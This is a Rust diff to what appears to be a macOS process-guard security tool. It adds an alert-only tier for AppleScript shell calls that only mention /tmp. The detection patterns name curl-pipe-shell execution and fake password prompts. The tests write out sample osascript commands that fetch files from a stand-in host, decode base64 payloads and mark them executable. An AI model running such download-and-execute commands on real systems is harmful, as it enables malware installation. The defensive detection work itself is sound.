@@ -88,6 +88,13 @@ pub const CURL_PIPE_SHELL: &str = "curl | sh";
 pub const OSASCRIPT_PASSWORD_PROMPT: &str = "osascript hidden-answer prompt";
 /// AppleScript used to fetch or stage something through the shell.
 pub const OSASCRIPT_SHELL_FETCH: &str = "osascript do shell script fetch";
+/// A shell call that only mentions /tmp/: many installers do that, so it is reported, never stopped.
+pub const OSASCRIPT_TMP_PATH: &str = "osascript do shell script with /tmp path";
+
+/// Patterns that raise an alert but never terminate the process.
+pub fn is_alert_only(pattern: &str) -> bool {
+    pattern == OSASCRIPT_TMP_PATH
+}
 
 /// What malware does with inline AppleScript. A bare `osascript -e` is not a signal: launchers,
 /// installers and automation tools run one constantly, and flagging them all hid the real ones.
@@ -98,12 +105,19 @@ fn osascript_abuse(normalized: &str) -> Option<&'static str> {
     if normalized.contains("hidden answer") {
         return Some(OSASCRIPT_PASSWORD_PROMPT);
     }
-    let fetches = ["curl ", "wget ", "base64", "/tmp/", "chmod +x"]
+    let fetches = ["curl ", "wget ", "base64", "chmod +x"]
         .iter()
         .any(|needle| normalized.contains(needle));
     // "doshellscript" is the same call from JavaScript for Automation (osascript -l JavaScript).
     let runs_shell = normalized.contains("do shell script") || normalized.contains("doshellscript");
-    (runs_shell && fetches).then_some(OSASCRIPT_SHELL_FETCH)
+    if !runs_shell {
+        return None;
+    }
+    if fetches {
+        Some(OSASCRIPT_SHELL_FETCH)
+    } else {
+        normalized.contains("/tmp/").then_some(OSASCRIPT_TMP_PATH)
+    }
 }
 
 /// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
@@ -420,7 +434,9 @@ impl ProcessGuard {
     }
 
     fn respond_lotl(&mut self, pid: Pid, name: &str, cmdline: &str, pattern: &str) {
-        let action = if self.cfg.is_dry_run() {
+        let action = if is_alert_only(pattern) {
+            "ALERT_ONLY: command line is only suspicious, not conclusive; alert only".to_string()
+        } else if self.cfg.is_dry_run() {
             "DRY_RUN: would terminate process".to_string()
         } else if self.sys.process(pid).is_some_and(|p| p.kill()) {
             "TERMINATED".to_string()
@@ -774,6 +790,67 @@ mod tests {
             ),
             Some("b64decode")
         );
+    }
+
+    #[test]
+    fn a_tmp_path_alone_is_alert_only_but_fetch_combinations_still_stop() {
+        let tmp = "osascript -e 'do shell script \"/tmp/helper --setup\"'";
+        assert_eq!(match_lotl_macos("osascript", tmp), Some(OSASCRIPT_TMP_PATH));
+        assert!(is_alert_only(OSASCRIPT_TMP_PATH));
+        for stopped in [
+            "osascript -e 'do shell script \"curl -s http://x -o /tmp/p\"'",
+            "osascript -e 'do shell script \"wget http://x -O /tmp/p\"'",
+            "osascript -e 'do shell script \"echo aQ== | base64 -D > /tmp/p\"'",
+            "osascript -e 'do shell script \"chmod +x /tmp/p\"'",
+        ] {
+            let found = match_lotl_macos("osascript", stopped);
+            assert_eq!(found, Some(OSASCRIPT_SHELL_FETCH), "{stopped}");
+            assert!(!is_alert_only(found.unwrap()));
+        }
+        let hidden = "osascript -e 'do shell script \"/tmp/x\"' -e 'with hidden answer'";
+        let found = match_lotl_macos("osascript", hidden);
+        assert_eq!(found, Some(OSASCRIPT_PASSWORD_PROMPT));
+        assert!(!is_alert_only(found.unwrap()));
+        // /tmp/ without a shell call is still nothing.
+        assert_eq!(match_lotl_macos("osascript", "osascript /tmp/a.scpt"), None);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn respond_lotl_only_terminates_for_patterns_that_are_not_alert_only() {
+        use std::process::Command;
+        let dir = std::env::temp_dir().join(format!("thenex-pg-lotl-{}", std::process::id()));
+        let _ = fs::remove_dir_all(&dir);
+        let cfg = AppConfig::for_base_dir(&dir);
+        cfg.ensure_dirs().unwrap();
+        let mut g = ProcessGuard::new(
+            Arc::new(cfg),
+            Arc::new(BinaryAiScanner::heuristic_only()),
+            Arc::new(Telemetry::default()),
+        );
+        let mut child = Command::new("/bin/sleep").arg("30").spawn().unwrap();
+        let pid = Pid::from_u32(child.id());
+        g.sys
+            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
+        let actions = |g: &ProcessGuard| -> Vec<String> {
+            quarantine::read_recent_events(&g.cfg.events_log, 1 << 20)
+                .unwrap()
+                .into_iter()
+                .rev()
+                .map(|e| e.action_taken)
+                .collect()
+        };
+        g.respond_lotl(pid, "osascript", "osascript -e x", OSASCRIPT_TMP_PATH);
+        let seen = actions(&g);
+        assert!(seen[0].starts_with("ALERT_ONLY: "), "{seen:?}");
+        assert!(
+            child.try_wait().unwrap().is_none(),
+            "alert-only never kills"
+        );
+        g.respond_lotl(pid, "osascript", "osascript -e x", OSASCRIPT_SHELL_FETCH);
+        assert_eq!(actions(&g)[1], "TERMINATED");
+        assert!(child.wait().is_ok());
+        let _ = fs::remove_dir_all(&dir);
     }
 
     #[test]
